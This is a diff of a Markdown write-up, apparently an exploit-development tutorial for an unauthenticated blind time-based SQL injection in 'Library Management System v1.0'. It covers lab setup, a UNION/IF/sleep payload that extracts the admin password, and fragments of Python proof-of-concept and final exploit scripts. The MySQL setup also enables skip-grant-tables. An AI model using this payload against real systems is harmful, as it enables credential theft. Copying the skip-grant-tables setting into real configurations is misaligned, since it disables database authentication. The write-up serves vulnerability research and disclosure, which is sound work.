@@ -244,6 +244,7 @@ sudo apt install php-xdebug -y
 Since we are using Apache, we will be modifying the PHP config file for Apache. 
 - Change directory to the `/etc/php/{Version}/apache2/` folder.
 - Open the `php.ini` file with a text editor, add the following to the bottom, and save:
+
 ```bash
 [xdebug]
 xdebug.mode = debug
@@ -262,6 +263,7 @@ Some blog posts that may help you if you get stuck:
 
 ## Restart Apache Service
 With the changes made to the Apache PHP configuration, restart the Apache2 service using Systemd.
+
 ```bash
 sudo systemctl restart apache2.service
 ```
@@ -303,6 +305,7 @@ With debugging setup, we will now enable SQL query logging. This will come in ve
 
 ## Modify MySQL Config
 To enable SQL query logging we will add the below to the `/etc/mysql/my.cnf` MySQL configuration file:
+
 ```bash
 [mysqld]
 general_log = on
@@ -311,12 +314,14 @@ skip-grant-tables
 ```
 
 Next, we will restart the MySQL service with Systemd to apply our changes:
+
 ```bash
 sudo systemctl restart mysql
 ```
 
 ## Streaming MySQL Log Output
 With MySQL logging enabled, we will `tail` the file and use the `-f` flag to continuously stream the output.
+
 ```bash
 sudo tail -f /var/log/mysql/mysql.log
 ```
@@ -377,6 +382,7 @@ We save some time, and just use the MySQL CLI to enumerate what the admin creden
 We see that the admin credential table is named `admin` and the passwords are stored in the `password` column. The admin's usernames are stored in the `adminName` column.
 
 At this point we know that our injection statement looks like this:
+
 ```sql
 SELECT returnDate from borrow where borrowId = '{INJECTION}';
 ```
@@ -388,6 +394,7 @@ We also see that the injectable query returns only 1 column `returnDate` from th
 We will use an `IF()` statement in our union query to check if we discovered the target character of the admins password. If we did guess the charater of the admins password correctly, the SQL database will sleep for 1 second.
 
 Our Blind SQL Injection payload to read administrators password so far:
+
 ```sql
 SELECT returnDate from borrow where borrowId = 'inject' UNION SELECT IF(SUBSTRING(password,1,1) = '{CHAR-WE-ARE-GUESSING}',sleep(1),null) FROM admin WHERE adminId=1;
 ```
@@ -408,6 +415,7 @@ Testing our payload in BurpSuite, we experience the same thing, a 1 second delay
 We know all information points to build our exploit. First we'll build and test that our exploit can determine when we hit a sleep (the right character).
 
 This is the PoC I Built:
+
 ```python
 import requests
 from colorama import Fore as F
@@ -458,6 +466,7 @@ if __name__ == "__main__":
 ```
 
 You may need to install the module dependencies:
+
 ```bash
 python3 -m pip install requests
 python3 -m pip install colorama
@@ -485,6 +494,8 @@ Now that we have it returning the password, lets make it more user friendly.
 
 ### Code for the final exploit:
 - Make sure to come up with some ASCII art ;)
+
+
 ```python
 import requests,argparse
 from colorama import (Fore as F, Back as B, Style as S)
@@ -571,7 +582,6 @@ def printTableRow(user,size):
     password  += BR+" "+ST
     print(username,password)
 
-
 def sig():
     SIG  = SB+FY+"         .-----.._       ,--.\n"
     SIG += FY+"         |  ..    >  ___ |  | .--.\n"
@@ -638,6 +648,7 @@ Now that we have a working exploit, lets submit it!
 
 ## Adding the Header
 We will add this to the top of exploit:
+
 ```bash
 # Exploit Title: Library Management System v1.0 - Unauthenticated Blind Time-Based SQL Injection
 # Exploit Author: Bobby Cooke (boku)
